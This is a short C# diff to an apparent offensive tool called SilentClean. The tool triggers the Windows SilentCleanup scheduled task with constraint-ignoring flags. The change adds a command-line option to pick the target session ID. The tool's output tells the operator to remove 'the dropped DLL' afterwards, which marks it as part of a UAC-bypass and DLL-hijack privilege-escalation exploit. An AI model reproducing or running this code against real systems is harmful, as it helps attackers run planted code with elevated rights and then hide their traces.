@@ -15,7 +15,16 @@ namespace SilentClean
                 {
                     var task = tasksrvc.FindAllTasks(new Regex("SilentClean*"));
                     Console.WriteLine("\n[*] Starting Task");
-                    task[0].RunEx(TaskRunFlags.IgnoreConstraints | TaskRunFlags.UseSessionId, 1, "", "");
+                    int sessionId = 1;
+                    if (args.Length > 0)
+                    {
+                        bool success = int.TryParse(args[0], out sessionId);
+                        if (!success) //take 1 as default sessionID if the first cmdline argument isn't an integer. 
+                        {
+                            sessionId = 1; 
+                        }
+                    }
+                    task[0].RunEx(TaskRunFlags.IgnoreConstraints | TaskRunFlags.UseSessionId, sessionId, "", "");
                     Console.WriteLine("\n[*] Make sure to clean-after yourself and remove the dropped DLL");
                 }
             } catch (Exception e)
